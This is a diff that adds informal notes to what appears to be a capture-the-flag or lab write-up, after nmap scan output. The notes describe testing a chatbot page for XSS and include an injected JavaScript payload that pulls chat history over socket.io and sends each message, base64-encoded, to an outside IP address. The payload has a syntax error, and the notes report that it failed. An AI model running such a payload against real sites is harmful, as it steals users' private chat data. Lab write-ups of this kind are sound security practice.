@@ -72,3 +72,33 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.31 seconds
 
+a webpage exist
+
+there is some chatbot that takes inputs from user
+
+nothing works except history
+
+used <img src="http://1.1.1.1/123">
+
+and the "image" shown it history, so it means that XSS is present here
+
+trying script:
+    const script = document.createElement('script');
+    script.src = '/socket.io/socket.io.js';
+    document.head.appendChild(script);
+    script.addEventListener('load', function () {
+        const res = axios.get(`/user/api/chat`);
+        const socket = io('/', { withCredentials: true });
+        socket.on('message', (my_message)  {
+            fetch("http://10.10.16.125:80/?d=" + btoa(my_message))
+        });
+        socket.emit('client_message', 'history');
+        });
+
+tried to inject on chatbot
+
+nothing
+
+
+
+             
